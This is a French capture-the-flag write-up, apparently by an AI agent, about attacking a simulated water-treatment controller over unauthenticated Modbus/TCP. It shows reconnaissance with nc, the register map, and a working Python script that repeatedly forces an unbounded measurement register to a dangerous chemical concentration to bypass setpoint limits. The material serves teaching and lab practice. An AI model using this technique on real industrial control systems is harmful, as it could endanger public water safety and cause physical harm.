# OT#001 — Water Treatment (Modbus TCP)

## Statut

Résolu. Flag récupéré et transmis à l'utilisateur pour soumission manuelle.
Le vrai flag est `CTF{REDACTED}` dans cette documentation.

## Cible

- `https://otctf.pages.dev/water-treatment/`
- Service : `<HOST>:6000` (Modbus/TCP brut, sans authentification ni chiffrement)
- Catégorie : OT / misc

## Reconnaissance

- `nc -vz <HOST> 6000` → port **open** ; aucune bannière au connect (service « client-first »).
- Énumération des function codes : seuls **`03` (read holding)**, **`06` (write single)** et
  **`10`/FC16 (write multiple)** répondent. `01/02/04/05/08/16/17/2B…` → exception `0x01`.
- Scan des holding registers : `r3 = 1` au repos, le reste à zéro.
- Écriture d'une grande valeur sur chaque adresse : seule `r0` renvoie **exception `0x03`**
  (plage bornée `0..200`).

## Découverte clé

L'état est **par connexion TCP** : une écriture suivie d'une lecture sur une *nouvelle* connexion
ne reflète rien. En tenant **une seule connexion persistante**, la carte apparaît :

| Registre | Rôle |
|----------|------|
| `r0` | setpoint ppm, borné `0..200` (contrôle de plage) |
| `r1` | concentration mesurée, **écriture non bornée**, rampe vers `r0` |
| `r2` | état pompe |
| `r3` | interlock process (`1` = normal) |

## Exploitation

1. `r0` (setpoint) est plafonné à 200 → impossible d'atteindre une concentration dangereuse
   par la voie « légitime ».
2. Le contrôle de plage n'est **pas** appliqué à `r1` (la mesure). On force donc directement la
   concentration mesurée : `FC06 write r1 = 11100`.
3. `r1` décroît vers `r0` → on **réécrit `r1=11100` en boucle** pour rendre le danger *soutenu*.
4. Après ~8 s de danger soutenu, le flag est écrit en ASCII (2 car./registre 16 bits) à partir
   du registre **100** (`0x64`).

```python
import socket, struct, time
s = socket.create_connection(("<HOST>", 6000), timeout=6); tid = 0
def call(pdu):
    global tid; tid += 1
    s.sendall(struct.pack(">HHHB", tid, 0, len(pdu)+1, 1) + pdu)
    return s.recv(4096)
def w6(a, v): return call(struct.pack(">BHH", 6, a, v))
def rd(a, q):
    d = call(struct.pack(">BHH", 3, a, q)); bc = d[8]; data = d[9:9+bc]
    return [struct.unpack(">H", data[i:i+2])[0] for i in range(0, len(data)-1, 2)]

for _ in range(300):
    w6(1, 11100); time.sleep(0.4)
    r = rd(100, 24)
    if any(r):
        print(b"".join(struct.pack(">H", x) for x in r).split(b"\x00")[0])
        break
```

## Résultat

- Flag (caviardé ici) : `CTF{REDACTED}`
- Transmis à l'utilisateur ; **soumission effectuée par l'utilisateur**, pas par l'agent.

## Leçons

- Toujours tester la persistance de l'état sur **une seule connexion** (les passerelles /
  instances multiples cassent la logique écriture-puis-lecture).
- Un contrôle de plage sur les *setpoints* ne protège pas les registres de *mesure* : chercher
  la donnée non validée.
- Le flag temporisé impose de maintenir la condition dangereuse, pas juste de l'atteindre.

La procédure Modbus est détaillée dans ce writeup.
